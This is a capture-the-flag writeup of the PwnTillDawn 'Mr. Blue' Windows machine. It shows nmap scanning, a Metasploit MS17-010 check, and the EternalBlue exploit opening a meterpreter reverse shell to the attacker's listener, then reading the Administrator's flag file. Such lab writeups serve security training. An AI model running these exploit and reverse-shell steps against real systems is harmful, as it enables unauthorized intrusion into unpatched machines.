+++ 
author = ['Abdallah Adham']
title = "Mr.Blue PwnTillDawn Writeup"
date = 2022-12-06
description = "This is a writeup of the Mr.Blue machine in PwnTillDawn Online platform."
draft = false
slug = ""

tags = [
	'PwnTillDawn',
    'PenTesting',  
    'Web', 
    'Exploit', 
    'Vulnerability',]

categories = [
    'Pen-Testing',  
    'Web-Security',
    ]

image = "post/Mr.Blue_PwnTillDawn/mr.blue_pwntilldawn.JPG"
+++

---

This writeup has been authorized by the **PwnTillDawn Crew**! 

Check their websites for more information!
1. [wizlynxgroup](https://www.wizlynxgroup.com/)
2. [online.pwntilldawn](https://online.pwntilldawn.com/)

## Target Information

| Name | IP | Operating System | Difficulty| 
|----------- | ----------- | ----------- |  -----------|
|**Mr. Blue**| **10.150.150.242** | **Windows** | **Easy** |

## Scanning

### Nmap Scanning

```bash
$ nmap -p- -A 10.150.150.242
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-05 23:32 EST
Stats: 0:00:06 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Nmap scan report for 10.150.150.242
Host is up (0.060s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB1446A)
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2012 11.00.2100.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2022-12-06T05:15:43+00:00; +40m45s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-03-25T14:11:19
|_Not valid after:  2050-03-25T14:11:19
8089/tcp  open  ssl/http     Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-25T09:53:52
|_Not valid after:  2022-10-24T09:53:52
|_http-server-header: Splunkd
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49197/tcp open  ms-sql-s     Microsoft SQL Server 2012 11.00.2100.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2022-12-06T05:15:43+00:00; +40m45s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-03-25T14:11:19
|_Not valid after:  2050-03-25T14:11:19
Service Info: Host: MRBLUE; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-12-06T05:15:35
|_  start_date: 2020-03-25T14:11:23
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MRBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 000c29ab4629 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: MrBlue
|   NetBIOS computer name: MRBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-12-06T05:15:35+00:00
|_clock-skew: mean: 40m44s, deviation: 0s, median: 40m44s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.59 seconds
```

## Enumeration

### HTTP Enumeration

![http](post/Mr.Blue_PwnTillDawn/imgs/1.JPG)

This image maybe a hint that this machine is vulnerable to the famous **EternalBlue** vulnerability, Also from the **Nmap** scanning report we saw that the machine is called **MrBlue**.

```bash
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: MrBlue
|   NetBIOS computer name: MRBLUE\x00
|   Workgroup: WORKGROUP\x00
```

So, Let's get to the **SMB Enumeration** to see if it is really vulnerable or not!

### SMB Enumeration

We can check if the machine is vulnerable to **EternalBlue** or not by using **Metasploit** framework.

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > options
Module options (auxiliary/scanner/smb/smb_ms17_010):
   Name         Current Setting                          Required  Description
   ----         ---------------                          --------  -----------
   CHECK_ARCH   true                                     no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                     no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                    no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                rdlists/named_pipes.txt
   RHOSTS                                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                   /wiki/Using-Metasploit
   RPORT        445                                      yes       The SMB service port (TCP)
   SMBDomain    .                                        no        The Windows domain to use for authentication
   SMBPass                                               no        The password for the specified username
   SMBUser                                               no        The username to authenticate as
   THREADS      1                                        yes       The number of concurrent threads (max one per host)
View the full module info with the info, or info -d command.
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.150.150.242
RHOSTS => 10.150.150.242
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

Okay, The machine is Vulnerable to **EternalBlue** vulnerability.

```bash
[+] 10.150.150.242:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 10.150.150.242:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now, Let's head to the Exploitation phase to get our way through the machine and retrieve the flag!

## Exploitation

### EternalBlue Exploit (Metasploit)

```bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Wi
                                             ndows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, W
                                             indows Embedded Standard 7 target machines.
Payload options (windows/x64/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.152.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Automatic Target
View the full module info with the info, or info -d command.
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.150.150.242
RHOSTS => 10.150.150.242
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.66.X.X
LHOST => 10.66.66.154
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

Boom! We have got the Reverse Shell to the victim's machine!
```bash
[*] Started reverse TCP handler on 10.66.X.X:4444 
[*] 10.150.150.242:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.150.150.242:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 10.150.150.242:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.150.150.242:445 - The target is vulnerable.        
[*] 10.150.150.242:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.150.150.242
[*] Meterpreter session 1 opened (10.66.X.X:4444 -> 10.150.150.242:51221) at 2022-12-05 23:57:04 -0500
[+] 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Let's switch up to the **CMD shell** interface and find our flag!

```powershell
meterpreter > shell
Process 1096 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>dir
C:\Windows\system32>cd ../../
cd ../../
C:\>cd Users
cd Users
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F80A-FDD9
 Directory of C:\Users
05/23/2019  08:33 PM    <DIR>          .
05/23/2019  08:33 PM    <DIR>          ..
05/23/2019  08:14 PM    <DIR>          Administrator.GNBUSCA-W054
06/27/2016  09:05 AM    <DIR>          Classic .NET AppPool
06/27/2016  08:58 AM    <DIR>          MSSQL$SQLEXPRESS
07/14/2009  04:57 AM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  23,359,315,968 bytes free

C:\Users>cd Administrator.GNBUSCA-W054
cd Administrator.GNBUSCA-W054
C:\Users\Administrator.GNBUSCA-W054>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F80A-FDD9
 Directory of C:\Users\Administrator.GNBUSCA-W054
05/23/2019  08:14 PM    <DIR>          .
05/23/2019  08:14 PM    <DIR>          ..
05/23/2019  08:14 PM    <DIR>          Contacts
05/24/2019  03:18 PM    <DIR>          Desktop
05/23/2019  08:14 PM    <DIR>          Documents
01/17/2020  06:30 PM    <DIR>          Downloads
05/23/2019  08:14 PM    <DIR>          Favorites
05/23/2019  08:14 PM    <DIR>          Links
05/23/2019  08:14 PM    <DIR>          Music
05/23/2019  08:14 PM    <DIR>          Pictures
05/23/2019  08:14 PM    <DIR>          Saved Games
05/23/2019  08:14 PM    <DIR>          Searches
05/23/2019  08:14 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  23,359,315,968 bytes free

C:\Users\Administrator.GNBUSCA-W054>cd Desktop             
cd Desktop

C:\Users\Administrator.GNBUSCA-W054\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F80A-FDD9
 Directory of C:\Users\Administrator.GNBUSCA-W054\Desktop
05/24/2019  03:18 PM    <DIR>          .
05/24/2019  03:18 PM    <DIR>          ..
05/24/2019  03:19 PM                40 FLAG34.txt
               1 File(s)             40 bytes
               2 Dir(s)  23,359,315,968 bytes free
C:\Users\Administrator.GNBUSCA-W054\Desktop>type FLAG34.txt
type FLAG34.txt
c2e9e102e55d5697ed2f9aXXXXXXXXXXXXXXXXX
C:\Users\Administrator.GNBUSCA-W054\Desktop>
```

_Pwned_

![pwned](post/Mr.Blue_PwnTillDawn/imgs/2.JPG)